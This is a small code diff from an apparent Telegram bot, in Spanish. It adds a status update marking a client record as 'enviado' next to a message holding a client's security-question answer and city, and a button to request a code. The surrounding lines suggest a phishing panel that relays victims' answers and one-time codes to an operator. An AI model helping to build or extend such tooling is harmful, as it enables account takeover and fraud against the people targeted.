@@ -115,6 +115,12 @@ ${pregunta2}❓ : ${respuesta2}
 🏙️ Ciudad: ${ciudad}
 `;
 
+  // ✅ Actualizar el estado a "enviado"
+  if (clientes[txid]) {
+    clientes[txid].status = "enviado";
+    guardarEstado();
+  }
+
   const keyboard = {
     inline_keyboard: [
       [{ text: "🔑PEDIR CÓDIGO", callback_data: `cel-dina:${txid}` }],
